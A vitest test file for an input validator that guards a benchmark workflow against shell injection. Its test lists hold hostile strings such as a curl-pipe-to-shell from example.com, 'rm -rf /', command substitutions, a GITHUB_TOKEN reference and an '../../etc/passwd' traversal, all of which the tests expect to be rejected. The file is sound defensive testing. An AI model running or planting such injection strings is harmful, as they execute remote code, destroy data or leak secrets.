import { describe, it, expect } from "vitest";
import path from "node:path";
import { execFileSync } from "node:child_process";
import { validateBenchmarkInputs, loadCorpusNames } from "../scripts/validate-benchmark-inputs.mjs";
import { REPO_ROOT } from "./helpers/test-build.js";

/**
 * Benchmark workflow input validation (Reliability Reset change R-5, audit V-18).
 * The workflow passes inputs only through environment variables and this
 * validator runs before any of them is used by a shell command.
 */
describe("validateBenchmarkInputs", () => {
  const corpus = loadCorpusNames(REPO_ROOT) as string[];

  it("accepts defaults (scheduled runs have empty inputs)", () => {
    expect(validateBenchmarkInputs({ repo: "", runs: "", seed: "" }, corpus)).toEqual({
      ok: true,
      repo: "all",
      runs: "10",
      seed: "42",
    });
  });

  it("accepts every corpus repository name exactly, case-insensitively", () => {
    for (const name of corpus) {
      expect(validateBenchmarkInputs({ repo: name.toUpperCase(), runs: "5", seed: "7" }, corpus)).toEqual({
        ok: true,
        repo: name,
        runs: "5",
        seed: "7",
      });
    }
  });

  const MALICIOUS = [
    "$(id)",
    "`id`",
    "all; curl https://example.com | sh",
    'vercel/commerce" && echo pwned && "',
    "vercel/commerce\nrm -rf /",
    "vercel/commerce'",
    "${GITHUB_TOKEN}",
    "../../etc/passwd",
    "commerce", // substring of a corpus name: not exact, rejected
  ];

  it.each(MALICIOUS)("rejects repo input %j", (repo) => {
    const result = validateBenchmarkInputs({ repo, runs: "10", seed: "42" }, corpus);
    expect(result.ok).toBe(false);
  });

  it.each(["$(id)", "10; ls", "1e3", "-1", "0", " 10", "10\n", "1234567"])("rejects runs input %j", (runs) => {
    expect(validateBenchmarkInputs({ repo: "all", runs, seed: "42" }, corpus).ok).toBe(false);
  });

  it.each(["$(id)", "42 && id", "-5", "4.2", "0x10", "12345678901"])("rejects seed input %j", (seed) => {
    expect(validateBenchmarkInputs({ repo: "all", runs: "10", seed }, corpus).ok).toBe(false);
  });

  it("exits non-zero from the command line for invalid input", () => {
    const script = path.join(REPO_ROOT, "scripts", "validate-benchmark-inputs.mjs");
    expect(() =>
      execFileSync(process.execPath, [script], {
        env: { ...process.env, IN_REPO: "$(id)", IN_RUNS: "10", IN_SEED: "42", GITHUB_OUTPUT: "" },
        stdio: "pipe",
      })
    ).toThrow();
    const ok = execFileSync(process.execPath, [script], {
      env: { ...process.env, IN_REPO: "all", IN_RUNS: "3", IN_SEED: "1", GITHUB_OUTPUT: "" },
      encoding: "utf-8",
    });
    expect(ok).toContain("repo=all runs=3 seed=1");
  });
});
